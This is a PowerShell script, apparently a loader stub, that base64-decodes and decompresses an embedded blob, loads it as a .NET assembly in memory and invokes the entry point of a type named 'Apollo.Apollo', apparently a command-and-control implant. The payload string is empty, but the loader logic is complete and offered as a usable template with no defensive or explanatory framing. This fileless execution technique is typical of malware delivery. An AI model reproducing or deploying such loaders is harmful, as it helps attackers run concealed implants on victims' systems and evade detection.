function Get-DecompressedByteArray {

	[CmdletBinding()]
    Param (
		[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [byte[]] $byteArray = $(Throw("-byteArray is required"))
    )
	Process {
	    Write-Verbose "Get-DecompressedByteArray"
        $input = New-Object System.IO.MemoryStream( , $byteArray )
	    $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.DeflateStream $input, ([IO.Compression.CompressionMode]::Decompress)
	    return $gzipStream
		#$gzipStream.CopyTo( $output )
        #$gzipStream.Close()
		#$input.Close()
		#[byte[]] $byteOutArray = $output.ToArray()
        #return $byteOutArray
    }
}
function Invoke-me {
	$EncodedAndCompressed = "
"
	$DecodedAndCompressed = [System.Convert]::FromBase64String($EncodedAndCompressed)
	$decompressedByteArray = Get-DecompressedByteArray -byteArray $DecodedAndCompressed

	$a = [System.Text.Encoding]::UTF8.GetByteCount($decompressedByteArray)
	#write-host $a
	#exit
	$UncompressedFileBytes = New-Object Byte[](10207160)
	$decompressedByteArray.Read($UncompressedFileBytes, 0, 10207160) | Out-Null
	#write-host $UncompressedFileBytes
	$assembly = [System.Reflection.Assembly]::Load($UncompressedFileBytes)


	# Get the static method that is the executable's entry point.
	# Note: Assumes 'ConsoleApp' as the class name, and a static method named 'Main' as the entry point.
	$entryPointMethod = $assembly.GetType('Apollo.Apollo', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')

	# Now you can call the entry point.
	# This example passes two arguments, 'foo' and 'bar'
	$entryPointMethod.Invoke($null, (, [string[]] ('foo', 'bar')))
}